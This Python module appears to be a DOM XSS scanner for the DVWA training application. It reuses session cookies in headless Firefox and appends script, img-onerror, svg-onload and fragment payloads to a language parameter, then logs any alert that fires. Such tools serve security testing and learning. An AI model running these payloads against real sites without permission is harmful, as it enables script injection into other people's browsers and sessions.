import requests
from bs4 import BeautifulSoup
from urllib.parse import urlencode, urljoin
from selenium import webdriver
from selenium.common.exceptions import (
    UnexpectedAlertPresentException, NoAlertPresentException, TimeoutException
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.firefox.options import Options as FirefoxOptions
import shutil
from rich.console import Console
from rich.table import Table
from rich.align import Align

console = Console()

def run(soup, headers, find_path_dic, security_level):
    xss_payloads = [
        '<script>alert("DOM XSS 1")</script>',
        '<img src=x onerror=alert("DOM XSS 2")>',
        '<svg/onload=alert("DOM XSS 3")>',
        '"><script>alert("DOM XSS 4")</script>',
        "';alert('DOM XSS 5');//",
        "English#<script>alert(123)</script>"
    ]

    allowed_values = ["French", "English", "German", "Spanish"]

    final_result = []
    printed_table_title = False

    for param_dic in find_path_dic:
        base_url = param_dic['url']
        param_method = param_dic['method']
        param_name = param_dic['param'][0]
        if param_method.upper() != 'GET':
            continue
        if '/vulnerabilities/xss_d' not in base_url:
            continue

        options = FirefoxOptions()
        options.binary_location = "/snap/firefox/current/usr/lib/firefox/firefox"
        options.add_argument("--headless")
        gecko_path = shutil.which("geckodriver") or "/snap/bin/geckodriver"
        service = FirefoxService(executable_path=gecko_path)
        driver = webdriver.Firefox(service=service, options=options)
        driver.set_page_load_timeout(10)

        main_url = base_url.replace('/vulnerabilities/xss_d/', '/')
        driver.get(main_url)
        driver.delete_all_cookies()

        cookie_header = headers.get('Cookie', '')
        for item in cookie_header.split(';'):
            if '=' in item:
                name, value = item.strip().split('=', 1)
                driver.add_cookie({'name': name.strip(), 'value': value.strip()})

        root_url = base_url.split('/vulnerabilities/')[0] + '/'
        security_url = urljoin(root_url, 'security.php')
        driver.get(security_url)

        for payload in xss_payloads:
            for safe_value in allowed_values:
                test_url = f"{base_url}?{param_name}={safe_value}{payload}"
                try:
                    driver.get(test_url)
                    WebDriverWait(driver, 3).until(EC.alert_is_present())
                    alert = driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()

                    if not printed_table_title:
                        aligned_title = Align("[italic bold green]DOM XSS 탐지 결과[/]", align="center")
                        console.print(aligned_title)
                        printed_table_title = True

                    table = Table(show_lines=True, title=None)
                    table.add_column("항목", style="white", justify="center")
                    table.add_column("내용", style="white", justify="center")
                    table.add_row("URL", test_url)
                    table.add_row("VULN NAME", "DOM XSS")
                    table.add_row("Payload", payload)
                    table.add_row("Alert", alert_text)
                    console.print(table)

                    final_result.append({"URL": test_url, "Payload": payload, "Alert": alert_text})

                except (NoAlertPresentException, TimeoutException):
                    continue
                except UnexpectedAlertPresentException:
                    try:
                        alert = driver.switch_to.alert
                        alert_text = alert.text
                        alert.accept()

                        if not printed_table_title:
                            aligned_title = Align("[italic bold white]DOM XSS 탐지 결과[/]", align="center")
                            console.print(aligned_title)
                            printed_table_title = True

                        table = Table(show_lines=True, title=None)
                        table.add_column("항목", style="white", justify="center")
                        table.add_column("내용", style="white", justify="center")
                        table.add_row("URL", test_url)
                        table.add_row("VULN NAME", "DOM XSS")
                        table.add_row("Payload", payload)
                        table.add_row("Alert", "Unexpected")
                        console.print(table)

                        final_result.append({"URL": test_url, "Payload": payload, "Alert": "Unexpected"})
                    except:
                        continue
                except Exception:
                    continue

        driver.quit()

    if not final_result:
        console.print("[!] DOM XSS 취약점이 없습니다.", style="bold red")
        return "[!] DOM XSS 취약점이 없습니다."

    console.print(f"[✓] DOM XSS 총 {len(final_result)}건 탐지 완료.", style="bold green")
    return final_result
